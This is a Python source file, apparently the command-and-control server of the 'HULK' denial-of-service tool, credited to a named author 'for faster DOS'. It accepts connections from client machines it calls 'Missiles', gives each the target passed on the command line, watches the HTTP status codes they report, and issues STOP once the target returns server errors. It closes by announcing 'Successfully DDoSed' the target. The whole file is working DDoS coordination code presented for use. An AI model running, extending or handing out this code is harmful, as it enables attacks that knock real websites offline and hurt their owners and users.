# Written by @DsChauhan08 for faster DOS
import queue
import re
import select
import socket
import sys

def get_hostname(ip):
    # change 1: Cache hostnames to avoid repeated lookups
    if ip not in hostname_cache:
        hostname_cache[ip] = socket.gethostbyaddr(ip)[0]
    return hostname_cache[ip]

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setblocking(0)
server.bind(('', 666))
server.listen(100)  # Max Number of Missiles available.

inputs = [server]
outputs = []
message_queues = {}
completed = False
hostname_cache = {}

target = sys.argv[1] if len(sys.argv) > 1 else ""
status_regex = re.compile(r'\[(.*)\]')

print("Hulk Server is Live!")

while inputs:
    readable, writable, exceptional = select.select(inputs, outputs, inputs)
    
    for elem in readable:
        if elem is server:
            connection, (ip, port) = elem.accept()
            missile = get_hostname(ip)
            print(f"Established connection with Missile {missile}:{port}.")
            connection.setblocking(0)
            inputs.append(connection)
            message_queues[connection] = queue.Queue()
        else:
            try:
                data = elem.recv(1024).decode()
                ip, port = elem.getpeername()
                missile = get_hostname(ip)
                print(f"[{missile}:{port}] {data}")
                
                if completed:
                    print(f"Sending Stop signal to [{missile}:{port}].")
                    message_queues[elem].put("STOP")
                elif (m := status_regex.search(data)):
                    status_list = m.group(1).split(',')
                    if all(int(status) < 500 for status in status_list):
                        message_queues[elem].put(target)
                    else:
                        completed = True
                        print(f"Sending Stop signal to [{missile}:{port}].")
                        message_queues[elem].put("STOP")
                elif data.lower() == "disconnecting":
                    print(f"Disconnected from [{missile}:{port}].")
                    del message_queues[elem]
                    if elem in outputs:
                        outputs.remove(elem)
                    inputs.remove(elem)
                    elem.close()
                    continue
                else:
                    message_queues[elem].put(target)
                
                if elem not in outputs:
                    outputs.append(elem)
            except (ConnectionResetError, BrokenPipeError):
                if elem in outputs:
                    outputs.remove(elem)
                inputs.remove(elem)
                elem.close()
                del message_queues[elem]
    
    for elem in writable:
        try:
            ip, port = elem.getpeername()
            missile = get_hostname(ip)
            next_msg = message_queues[elem].get_nowait()
            elem.send(next_msg.encode())
            print(f"Attached target [{next_msg}] to [{missile}:{port}].")
        except queue.Empty:
            outputs.remove(elem)
        except (ConnectionResetError, BrokenPipeError):
            if elem in outputs:
                outputs.remove(elem)
    
    for elem in exceptional:
        inputs.remove(elem)
        if elem in outputs:
            outputs.remove(elem)
        elem.close()
        del message_queues[elem]

print(f"Successfully DDoSed {target}!")
